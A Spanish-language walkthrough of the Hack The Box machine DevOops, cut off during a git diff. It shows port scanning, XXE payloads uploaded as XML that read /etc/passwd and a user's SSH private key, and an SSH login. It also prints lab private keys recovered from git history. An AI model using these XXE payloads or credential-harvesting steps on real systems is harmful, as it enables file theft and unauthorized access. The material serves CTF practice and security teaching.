---
layout: single
title: DevOops - Hack The Box
excerpt: "En este post vamos a estar haciendo la maquina DevOops de la plataforma de Hackthebox donde mediante la explotación de un XXE vamos a poder leer archivos de la maquina entre esos la id_rsa de un usuario gracias a eso nos conectaremos por SSH y mediante la enumeración de un proyecto de Github podremos obtener la id_rsa del usuario root para conectarnos también por SSH"
date: 2023-06-26
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/htb-writeup-DevOops/icon.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:  
  - XXE (XML External Entity Injection)
  - Abusing a Github project
  - XXE - Private SSH Key
---

<p align="center">
<img src="/assets/images/htb-writeup-DevOops/banner.png">
</p>

⮕ Maquina Linux

```bash
❯ ping -c 1 10.10.10.91
PING 10.10.10.91 (10.10.10.91) 56(84) bytes of data.
64 bytes from 10.10.10.91: icmp_seq=1 ttl=63 time=93.2 ms

--- 10.10.10.91 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 93.157/93.157/93.157/0.000 ms
❯ whichSystem.py 10.10.10.91

10.10.10.91 (ttl -> 63): Linux
```

## PortScan

<https://github.com/MikeRega7/nrunscan>

```bash
❯ ./nrunscan.sh -i
 Give me the IP target: 10.10.10.91

Starting the scan with nmap
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-26 13:14 CST
Initiating SYN Stealth Scan at 13:14
Scanning 10.10.10.91 [65535 ports]
Discovered open port 22/tcp on 10.10.10.91
Discovered open port 5000/tcp on 10.10.10.91
Completed SYN Stealth Scan at 13:14, 14.28s elapsed (65535 total ports)
Nmap scan report for 10.10.10.91
Host is up, received user-set (0.10s latency).
Scanned at 2023-06-26 13:14:39 CST for 15s
Not shown: 65512 closed tcp ports (reset), 21 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
5000/tcp open  upnp    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 14.49 seconds
           Raw packets sent: 70514 (3.103MB) | Rcvd: 68907 (2.756MB)

[*] Extracting information...

	[*] IP Target: 10.10.10.91
	[*] Open Ports:  22,5000

[*] Ports copied to clipboard


Escaning the services and technologies in the ports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-26 13:14 CST
Nmap scan report for 10.10.10.91
Host is up (0.094s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4290e335318d8b86172afb3890dac495 (RSA)
|   256 b7b6dcc44c879b752a008983edb28031 (ECDSA)
|_  256 d52f1953b28e3a4bb3dd3c1fc0370d00 (ED25519)
5000/tcp open  http    Gunicorn 19.7.1
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-server-header: gunicorn/19.7.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.67 seconds

[+]...If another port run a http server you can use the script http-enum of nmap

[+]...Example nmap --script http-enum -p {ports} {ip}

[*] Port 80 and 8080 are not open, exiting...


Thanks for using the script! Happy Hacking
```

## Enumeracion

Vemos que el puerto **5000** esta corriendo un servicio **http** así que vamos a ver las tecnologías que están corriendo en ese servicio con la herramienta **whatweb**

```ruby
❯ whatweb http://10.10.10.91:5000
http://10.10.10.91:5000 [200 OK] Country[RESERVED][ZZ], HTTPServer[gunicorn/19.7.1], IP[10.10.10.91]
```

Esta es la **web**

![](/assets/images/htb-writeup-DevOops/web1.png)

Bueno como tal nos dice que el sitio esta en construcción vamos aplicar **Fuzzing** ademas se esta empleando **PHP**

Y bueno hay un directorio **Upload** el cual su código de estado es **200**

```bash
❯ gobuster dir -u http://10.10.10.91:5000 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.91:5000
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/06/26 13:39:33 Starting gobuster in directory enumeration mode
===============================================================
/feed                 (Status: 200) [Size: 546263]
/upload               (Status: 200) [Size: 347]   
```

Si vemos que tenemos un campo de subida de archivos

![](/assets/images/htb-writeup-DevOops/web2.png)

Tenemos que subir elementos **XML** así que podemos hacer una prueba subiendo un archivo **XML** para ver que pasa

```bash
❯ nano test.xml
❯ catn test.xml
Hi I'm 
```

Ahora vamos a subirlo ala maquina victima

Pero al darle a **upload** y subirlo nos da este error

![](/assets/images/htb-writeup-DevOops/web3.png)

Lo que esta pasando es que alomejor la web como tal esta esperando que la estructura sea **XML** lo cual no lo estamos haciendo lo que podemos hacer es crear el archivo con la estructura y pasandole los elementos que nos pide

```bash
❯ catn test.xml
<elements>
	<Author>MiguelRega7</Author>
	<Subject>Test</Subject>
	<Content>Test2</Content>
</elements>
```

Si lo subimos vemos que funciona

![](/assets/images/htb-writeup-DevOops/web4.png)

También ya vemos un usuario `roosa` como el **input** se refleja en el **output** podemos aplicar un **XML External Entity Injection (XXE)**

## XML External Entity Injection (XXE)

>Cuando hablamos de **XML External Entity** (**XXE**) **Injection**, a lo que nos referimos es a una vulnerabilidad de seguridad en la que un atacante puede utilizar una entrada XML maliciosa para acceder a recursos del sistema que normalmente no estarían disponibles, como archivos locales o servicios de red. Esta vulnerabilidad puede ser explotada en aplicaciones que utilizan XML para procesar entradas, como aplicaciones web o servicios web.

Lo que tenemos que usar son **entidades** <https://portswigger.net/web-security/xxe> 

Lo que estamos haciendo es declarar la entidad **xxe** que lo que queremos es que nos muestre el **/etc/passwd** de la maquina y como podemos ver el **output** podemos decirle que nos muestre el contenido de la **entidad** en caso de que lo interprete deberias ver el **/etc/passwd** gracias al **wrapper** que es **file**

```bash
❯ catn pwn.xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<elements>
	<Author>&xxe;</Author>
	<Subject>Test</Subject>
	<Content>Test2</Content>
</elements>
```

Vamos a subirlo 

Y funciona

![](/assets/images/htb-writeup-DevOops/web5.png)

Bueno como pudimos ver el **/etc/passwd** de la maquina sabemos que el usuario **roosa** existe así que podemos tratar de ver si podemos ver su **id_rsa** para conectarnos por **SSH**

```bash
❯ catn pwn.xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///home/roosa/.ssh/id_rsa"> ]>
<elements>
	<Author>&xxe;</Author>
	<Subject>Test</Subject>
	<Content>Test2</Content>
</elements>
```

Ahora vamos a subirlo

Y vemos la **id_rsa**

![](/assets/images/htb-writeup-DevOops/web6.png)

## Shell as roosa

```bash
❯ catn id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAuMMt4qh/ib86xJBLmzePl6/5ZRNJkUj/Xuv1+d6nccTffb/7
9sIXha2h4a4fp18F53jdx3PqEO7HAXlszAlBvGdg63i+LxWmu8p5BrTmEPl+cQ4J
R/R+exNggHuqsp8rrcHq96lbXtORy8SOliUjfspPsWfY7JbktKyaQK0JunR25jVk
v5YhGVeyaTNmSNPTlpZCVGVAp1RotWdc/0ex7qznq45wLb2tZFGE0xmYTeXgoaX4
9QIQQnoi6DP3+7ErQSd6QGTq5mCvszpnTUsmwFj5JRdhjGszt0zBGllsVn99O90K
m3pN8SN1yWCTal6FLUiuxXg99YSV0tEl0rfSUwIDAQABAoIBAB6rj69jZyB3lQrS
JSrT80sr1At6QykR5ApewwtCcatKEgtu1iWlHIB9TTUIUYrYFEPTZYVZcY50BKbz
ACNyme3rf0Q3W+K3BmF//80kNFi3Ac1EljfSlzhZBBjv7msOTxLd8OJBw8AfAMHB
lCXKbnT6onYBlhnYBokTadu4nbfMm0ddJo5y32NaskFTAdAG882WkK5V5iszsE/3
koarlmzP1M0KPyaVrID3vgAvuJo3P6ynOoXlmn/oncZZdtwmhEjC23XALItW+lh7
e7ZKcMoH4J2W8OsbRXVF9YLSZz/AgHFI5XWp7V0Fyh2hp7UMe4dY0e1WKQn0wRKe
8oa9wQkCgYEA2tpna+vm3yIwu4ee12x2GhU7lsw58dcXXfn3pGLW7vQr5XcSVoqJ
Lk6u5T6VpcQTBCuM9+voiWDX0FUWE97obj8TYwL2vu2wk3ZJn00U83YQ4p9+tno6
NipeFs5ggIBQDU1k1nrBY10TpuyDgZL+2vxpfz1SdaHgHFgZDWjaEtUCgYEA2B93
hNNeXCaXAeS6NJHAxeTKOhapqRoJbNHjZAhsmCRENk6UhXyYCGxX40g7i7T15vt0
ESzdXu+uAG0/s3VNEdU5VggLu3RzpD1ePt03eBvimsgnciWlw6xuZlG3UEQJW8sk
A3+XsGjUpXv9TMt8XBf3muESRBmeVQUnp7RiVIcCgYBo9BZm7hGg7l+af1aQjuYw
agBSuAwNy43cNpUpU3Ep1RT8DVdRA0z4VSmQrKvNfDN2a4BGIO86eqPkt/lHfD3R
KRSeBfzY4VotzatO5wNmIjfExqJY1lL2SOkoXL5wwZgiWPxD00jM4wUapxAF4r2v
vR7Gs1zJJuE4FpOlF6SFJQKBgHbHBHa5e9iFVOSzgiq2GA4qqYG3RtMq/hcSWzh0
8MnE1MBL+5BJY3ztnnfJEQC9GZAyjh2KXLd6XlTZtfK4+vxcBUDk9x206IFRQOSn
y351RNrwOc2gJzQdJieRrX+thL8wK8DIdON9GbFBLXrxMo2ilnBGVjWbJstvI9Yl
aw0tAoGAGkndihmC5PayKdR1PYhdlVIsfEaDIgemK3/XxvnaUUcuWi2RhX3AlowG
xgQt1LOdApYoosALYta1JPen+65V02Fy5NgtoijLzvmNSz+rpRHGK6E8u3ihmmaq
82W3d4vCUPkKnrgG8F7s3GL6cqWcbZBd0j9u88fUWfPxfRaQU3s=
-----END RSA PRIVATE KEY-----
❯ chmod 600 id_rsa
```

```bash
❯ ssh -i id_rsa roosa@10.10.10.91
The authenticity of host '10.10.10.91 (10.10.10.91)' can't be established.
ECDSA key fingerprint is SHA256:hbD2D4PdnIVpAFHV8sSAbtM0IlTAIpYZ/nwspIdp4Vg.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.91' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.13.0-37-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

135 packages can be updated.
60 updates are security updates.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

roosa@devoops:~$ export TERM=xterm
roosa@devoops:~$
```

## User.txt 

```bash
roosa@devoops:~$ cat user.txt 
564c4f3c11ae61632b7859010e9578da
roosa@devoops:~$ 
```

## Escalada de privilegios

Vemos que hay otro usuario que se llama **git**

```bash
roosa@devoops:~$ cat /etc/passwd | grep sh
root:x:0:0:root:/root:/bin/bash
git:x:1001:1001:git,,,:/home/git:/bin/bash
roosa:x:1002:1002:,,,:/home/roosa:/bin/bash
sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin
roosa@devoops:~$ 
```

Vemos el **pkexec** pero no lo vamos a explotar 

```bash
roosa@devoops:/$ find \-perm -4000 2>/dev/null
./bin/ntfs-3g
./bin/umount
./bin/su
./bin/ping6
./bin/mount
./bin/ping
./bin/fusermount
./usr/bin/chsh
./usr/bin/vmware-user-suid-wrapper
./usr/bin/gpasswd
./usr/bin/pkexec
./usr/bin/passwd
./usr/bin/chfn
./usr/bin/sudo
./usr/bin/newgrp
./usr/lib/policykit-1/polkit-agent-helper-1
./usr/lib/xorg/Xorg.wrap
./usr/lib/openssh/ssh-keysign
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/snapd/snap-confine
./usr/lib/eject/dmcrypt-get-device
./usr/lib/i386-linux-gnu/oxide-qt/chrome-sandbox
./usr/sbin/pppd
roosa@devoops:/$ 
```

Como no sabemos su contraseña no podemos ver si tenemos un privilegio a nivel de sudoers

```bash
roosa@devoops:/dev/shm$ sudo -l
[sudo] password for roosa: 
roosa@devoops:/dev/shm$ 
```

Si nos vamos a este directorio vemos los archivos típicos cuando te creas un repositorio en **GitHub**

```bash
roosa@devoops:~$ cd work/
roosa@devoops:~/work$ ls -la
total 12
drwxrwxr-x  3 roosa roosa 4096 Mar 26  2021 .
drwxr-xr-x 22 roosa roosa 4096 Sep 23  2022 ..
drwxrwx---  5 roosa roosa 4096 Mar 26  2021 blogfeed
roosa@devoops:~/work$ cd blogfeed/
roosa@devoops:~/work/blogfeed$ ls
README.md  resources  run-gunicorn.sh  src
roosa@devoops:~/work/blogfeed$ 
```

Vemos que hay un proyecto de **GitHub** 

```bash
roosa@devoops:~/work/blogfeed$ ls -la
total 28
drwxrwx--- 5 roosa roosa 4096 Mar 26  2021 .
drwxrwxr-x 3 roosa roosa 4096 Mar 26  2021 ..
drwxrwx--- 8 roosa roosa 4096 Mar 26  2021 .git
-rw-rw---- 1 roosa roosa  104 Mar 19  2018 README.md
drwxrwx--- 3 roosa roosa 4096 Mar 26  2021 resources
-rwxrw-r-- 1 roosa roosa  180 Mar 21  2018 run-gunicorn.sh
drwxrwx--- 2 roosa roosa 4096 Mar 26  2021 src
roosa@devoops:~/work/blogfeed$ 
```

Bueno si hacemos un `find .` para ver todos los recursos que existen este de arriba llama la atención por su nombre

```bash
roosa@devoops:~/work/blogfeed$ find .
.
./run-gunicorn.sh
./resources
./resources/integration
./resources/integration/authcredentials.key
./.git
./.git/objects
./.git/objects/33
./.git/objects/33/e87c312c08735a02fa9c796021a4a3023129ad
./.git/objects/17
./.git/objects/17/5743e03c7472fe9ede3d37e6eab7b35a88fbd8
./.git/objects/pack
./.git/objects/09
./.git/objects/09/2df11679f54b8a63c67ee809098137a8862cdc
./.git/objects/12
./.git/objects/12/65450ddc99e8d15b724df9c14fcf94fab3e4f5
./.git/objects/12/43ddacbe89c344e1074c094ce34eae7de1a463
./.git/objects/ce
./.git/objects/ce/c54d8cb6117fd7f164db142f0348a74d3e9a70
./.git/objects/c9
./.git/objects/c9/6ca250c890f1e62cc7c38d6700ee7fab8d66dc
./.git/objects/51
./.git/objects/51/ecfea82c6979665cde44c3d3635839d792e3fd
./.git/objects/f4
./.git/objects/f4/bde49fc24d1fd47a05c4b0d50b70366f4e9c56
./.git/objects/7f
./.git/objects/7f/f507d029021b0915235ff91e6a74ba33009c6d
./.git/objects/f9
./.git/objects/f9/00a57d3ff4ea618feca15263b83be8dc3d584d
./.git/objects/67
./.git/objects/67/4d6cec88527a58636009b4cc2af226b656460a
./.git/objects/49
./.git/objects/49/48f3b13accce989d26ca1e7ce9a4a2b1a5f039
./.git/objects/32
./.git/objects/32/93fdb4a599c0d05e0b13af035a7c8024376e80
./.git/objects/07
./.git/objects/07/f8fb3d48674b59186868e145b45be7c6bbafcf
./.git/objects/07/79936f6497aa995421a55cc2ba99b8e8fb0097
./.git/objects/f3
./.git/objects/f3/4d3c1444928c71b04a230ffdca810ac3846eb0
./.git/objects/c2
./.git/objects/c2/5f135513a4db4e2f87418e7bf1107cd7c25371
./.git/objects/ca
./.git/objects/ca/3e768f2434511e75bd5137593895bd38e1b1c2
./.git/objects/df
./.git/objects/df/ebfdfd9146c98432d19e3f7d83cc5f3adbfe94
./.git/objects/30
./.git/objects/30/aad4b269eb0012f1b5f4f13919bc68deac70a2
./.git/objects/28
./.git/objects/28/663660daa527d277c0a82774fbfdabb0abad3f
./.git/objects/26
./.git/objects/26/ae6c8668995b2f09bf9e2809c36b156207bfa8
./.git/objects/81
./.git/objects/81/9aa9ac0cb6bc12029206bdfbb7bca97bc69d9b
./.git/objects/81/e7ce0773f92d2dc343de62d259429d39b3674f
./.git/objects/6d
./.git/objects/6d/e2b19ed2bbba93cdabaf3b8bedd98ddabfd993
./.git/objects/info
./.git/objects/b5
./.git/objects/b5/244f5eba4bee25f44039fc1afb41d1a5d6aaf3
./.git/objects/34
./.git/objects/34/9920466cd0d9651ddb9f04d6d2ff554403a60f
./.git/objects/fe
./.git/objects/fe/0a1d021a0dacc771ac785c399071876e5a6ae1
./.git/objects/63
./.git/objects/63/0385e58a1be801492795aba3057bc86495d590
./.git/objects/70
./.git/objects/70/27688693a2b0ca9fb1b80dd00ec193c5da0a29
./.git/objects/9c
./.git/objects/9c/8c24eaf6ad15864c76278009d35da1a139d322
./.git/objects/e1
./.git/objects/e1/4586d1a0f07cd37e1793a07b63339b9fc5f95e
./.git/objects/14
./.git/objects/14/22e5a04d1b52a44e6dc81023420347e257ee5f
./.git/objects/d3
./.git/objects/d3/87abf63e05c9628a59195cec9311751bdb283f
./.git/objects/15
./.git/objects/15/661d8b2cd141c488c488a85d11f62143cb12b2
./.git/objects/44
./.git/objects/44/c981f1e321f48a127adb6a40b0e05545cc32a8
./.git/HEAD
./.git/description
./.git/index
./.git/info
./.git/info/exclude
./.git/logs
./.git/logs/HEAD
./.git/logs/refs
./.git/logs/refs/remotes
./.git/logs/refs/remotes/origin
./.git/logs/refs/remotes/origin/master
./.git/logs/refs/heads
./.git/logs/refs/heads/master
./.git/refs
./.git/refs/remotes
./.git/refs/remotes/origin
./.git/refs/remotes/origin/master
./.git/refs/tags
./.git/refs/heads
./.git/refs/heads/master
./.git/COMMIT_EDITMSG
./.git/hooks
./.git/hooks/commit-msg.sample
./.git/hooks/pre-commit.sample
./.git/hooks/applypatch-msg.sample
./.git/hooks/pre-push.sample
./.git/hooks/pre-rebase.sample
./.git/hooks/update.sample
./.git/hooks/post-update.sample
./.git/hooks/pre-applypatch.sample
./.git/hooks/prepare-commit-msg.sample
./.git/config
./.git/branches
./src
./src/access.log
./src/save.p
./src/feed.log
./src/app.py~
./src/feed.py
./src/app.py
./src/feed.pyc
./src/config.py
./src/.feed.py.swp
./src/devsolita-snapshot.png
./src/upload.html
./src/index.html
./README.md
roosa@devoops:~/work/blogfeed$ 
```

Si le hacemos un `cat` vemos que es una clave privada

```bash
roosa@devoops:~/work/blogfeed$ cat ./resources/integration/authcredentials.key
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEApc7idlMQHM4QDf2d8MFjIW40UickQx/cvxPZX0XunSLD8veN
ouroJLw0Qtfh+dS6y+rbHnj4+HySF1HCAWs53MYS7m67bCZh9Bj21+E4fz/uwDSE
23g18kmkjmzWQ2AjDeC0EyWH3k4iRnABruBHs8+fssjW5sSxze74d7Ez3uOI9zPE
sQ26ynmLutnd/MpyxFjCigP02McCBrNLaclcbEgBgEn9v+KBtUkfgMgt5CNLfV8s
ukQs4gdHPeSj7kDpgHkRyCt+YAqvs3XkrgMDh3qI9tCPfs8jHUvuRHyGdMnqzI16
ZBlx4UG0bdxtoE8DLjfoJuWGfCF/dTAFLHK3mwIDAQABAoIBADelrnV9vRudwN+h
LZ++l7GBlge4YUAx8lkipUKHauTL5S2nDZ8O7ahejb+dSpcZYTPM94tLmGt1C2bO
JqlpPjstMu9YtIhAfYF522ZqjRaP82YIekpaFujg9FxkhKiKHFms/2KppubiHDi9
oKL7XLUpSnSrWQyMGQx/Vl59V2ZHNsBxptZ+qQYavc7bGP3h4HoRurrPiVlmPwXM
xL8NWx4knCZEC+YId8cAqyJ2EC4RoAr7tQ3xb46jC24Gc/YFkI9b7WCKpFgiszhw
vFvkYQDuIvzsIyunqe3YR0v8TKEfWKtm8T9iyb2yXTa+b/U3I9We1P+0nbfjYX8x
6umhQuECgYEA0fvp8m2KKJkkigDCsaCpP5dWPijukHV+CLBldcmrvUxRTIa8o4e+
OWOMW1JPEtDTj7kDpikekvHBPACBd5fYnqYnxPv+6pfyh3H5SuLhu9PPA36MjRyE
4+tDgPvXsfQqAKLF3crG9yKVUqw2G8FFo7dqLp3cDxCs5sk6Gq/lAesCgYEAyiS0
937GI+GDtBZ4bjylz4L5IHO55WI7CYPKrgUeKqi8ovKLDsBEboBbqRWcHr182E94
SQMoKu++K1nbly2YS+mv4bOanSFdc6bT/SAHKdImo8buqM0IhrYTNvArN/Puv4VT
Nszh8L9BDEc/DOQQQzsKiwIHab/rKJHZeA6cBRECgYEAgLg6CwAXBxgJjAc3Uge4
eGDe3y/cPfWoEs9/AptjiaD03UJi9KPLegaKDZkBG/mjFqFFmV/vfAhyecOdmaAd
i/Mywc/vzgLjCyBUvxEhazBF4FB8/CuVUtnvAWxgJpgT/1vIi1M4cFpkys8CRDVP
6TIQBw+BzEJemwKTebSFX40CgYEAtZt61iwYWV4fFCln8yobka5KoeQ2rCWvgqHb
8rH4Yz0LlJ2xXwRPtrMtJmCazWdSBYiIOZhTexe+03W8ejrla7Y8ZNsWWnsCWYgV
RoGCzgjW3Cc6fX8PXO+xnZbyTSejZH+kvkQd7Uv2ZdCQjcVL8wrVMwQUouZgoCdA
qML/WvECgYEAyNoevgP+tJqDtrxGmLK2hwuoY11ZIgxHUj9YkikwuZQOmFk3EffI
T3Sd/6nWVzi1FO16KjhRGrqwb6BCDxeyxG508hHzikoWyMN0AA2st8a8YS6jiOog
bU34EzQLp7oRU/TKO6Mx5ibQxkZPIHfgA1+Qsu27yIwlprQ64+oeEr0=
-----END RSA PRIVATE KEY-----
roosa@devoops:~/work/blogfeed$ 
```

De primeras no sabemos para que usuario es pero como es un proyecto de **GitHub** podemos enumerarlo y ver todos los **commits** que han habido en el proyecto

```bash
roosa@devoops:~/work/blogfeed$ git log
commit 7ff507d029021b0915235ff91e6a74ba33009c6d
Author: Roosa Hakkerson <roosa@solita.fi>
Date:   Mon Mar 26 06:13:55 2018 -0400

    Use Base64 for pickle feed loading

commit 26ae6c8668995b2f09bf9e2809c36b156207bfa8
Author: Roosa Hakkerson <roosa@solita.fi>
Date:   Tue Mar 20 15:37:00 2018 -0400

    Set PIN to make debugging faster as it will no longer change every time the application code is changed. Remember to remove before production use.

commit cec54d8cb6117fd7f164db142f0348a74d3e9a70
Author: Roosa Hakkerson <roosa@solita.fi>
Date:   Tue Mar 20 15:08:09 2018 -0400

    Debug support added to make development more agile.

commit ca3e768f2434511e75bd5137593895bd38e1b1c2
Author: Roosa Hakkerson <roosa@solita.fi>
Date:   Tue Mar 20 08:38:21 2018 -0400

    Blogfeed app, initial version.

commit dfebfdfd9146c98432d19e3f7d83cc5f3adbfe94
Author: Roosa Hakkerson <roosa@solita.fi>
Date:   Tue Mar 20 08:37:56 2018 -0400

    Gunicorn startup script

commit 33e87c312c08735a02fa9c796021a4a3023129ad
Author: Roosa Hakkerson <roosa@solita.fi>
Date:   Mon Mar 19 09:33:06 2018 -0400

    reverted accidental commit with proper key

commit d387abf63e05c9628a59195cec9311751bdb283f
Author: Roosa Hakkerson <roosa@solita.fi>
Date:   Mon Mar 19 09:32:03 2018 -0400

    add key for feed integration from tnerprise backend

commit 1422e5a04d1b52a44e6dc81023420347e257ee5f
Author: Roosa Hakkerson <roosa@solita.fi>
Date:   Mon Mar 19 09:24:30 2018 -0400

    Initial commit
```

Si examinamos el **reverted accidental commit with proper keyd**

Vemos que elimino una parte de la **id_rsa** y le metió otra cosa diferente

```bash
roosa@devoops:~/work/blogfeed$ git log -p 33e87c312c08735a02fa9c796021a4a3023129ad
commit 33e87c312c08735a02fa9c796021a4a3023129ad
Author: Roosa Hakkerson <roosa@solita.fi>
Date:   Mon Mar 19 09:33:06 2018 -0400

    reverted accidental commit with proper key

diff --git a/resources/integration/authcredentials.key b/resources/integration/authcredentials.key
index 44c981f..f4bde49 100644
--- a/resources/integration/authcredentials.key
+++ b/resources/integration/authcredentials.key
@@ -1,28 +1,27 @@
 -----BEGIN RSA PRIVATE KEY-----
-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
+MIIEpQIBAAKCAQEApc7idlMQHM4QDf2d8MFjIW40UickQx/cvxPZX0XunSLD8veN
+ouroJLw0Qtfh+dS6y+rbHnj4+HySF1HCAWs53MYS7m67bCZh9Bj21+E4fz/uwDSE
+23g18kmkjmzWQ2AjDeC0EyWH3k4iRnABruBHs8+fssjW5sSxze74d7Ez3uOI9zPE
+sQ26ynmLutnd/MpyxFjCigP02McCBrNLaclcbEgBgEn9v+KBtUkfgMgt5CNLfV8s
+ukQs4gdHPeSj7kDpgHkRyCt+YAqvs3XkrgMDh3qI9tCPfs8jHUvuRHyGdMnqzI16
+ZBlx4UG0bdxtoE8DLjfoJuWGfCF/dTAFLHK3mwIDAQABAoIBADelrnV9vRudwN+h
+LZ++l7GBlge4YUAx8lkipUKHauTL5S2nDZ8O7ahejb+dSpcZYTPM94tLmGt1C2bO
+JqlpPjstMu9YtIhAfYF522ZqjRaP82YIekpaFujg9FxkhKiKHFms/2KppubiHDi9
+oKL7XLUpSnSrWQyMGQx/Vl59V2ZHNsBxptZ+qQYavc7bGP3h4HoRurrPiVlmPwXM
+xL8NWx4knCZEC+YId8cAqyJ2EC4RoAr7tQ3xb46jC24Gc/YFkI9b7WCKpFgiszhw
+vFvkYQDuIvzsIyunqe3YR0v8TKEfWKtm8T9iyb2yXTa+b/U3I9We1P+0nbfjYX8x
+6umhQuECgYEA0fvp8m2KKJkkigDCsaCpP5dWPijukHV+CLBldcmrvUxRTIa8o4e+
+OWOMW1JPEtDTj7kDpikekvHBPACBd5fYnqYnxPv+6pfyh3H5SuLhu9PPA36MjRyE
+4+tDgPvXsfQqAKLF3crG9yKVUqw2G8FFo7dqLp3cDxCs5sk6Gq/lAesCgYEAyiS0
+937GI+GDtBZ4bjylz4L5IHO55WI7CYPKrgUeKqi8ovKLDsBEboBbqRWcHr182E94
+SQMoKu++K1nbly2YS+mv4bOanSFdc6bT/SAHKdImo8buqM0IhrYTNvArN/Puv4VT
+Nszh8L9BDEc/DOQQQzsKiwIHab/rKJHZeA6cBRECgYEAgLg6CwAXBxgJjAc3Uge4
+eGDe3y/cPfWoEs9/AptjiaD03UJi9KPLegaKDZkBG/mjFqFFmV/vfAhyecOdmaAd
+i/Mywc/vzgLjCyBUvxEhazBF4FB8/CuVUtnvAWxgJpgT/1vIi1M4cFpkys8CRDVP
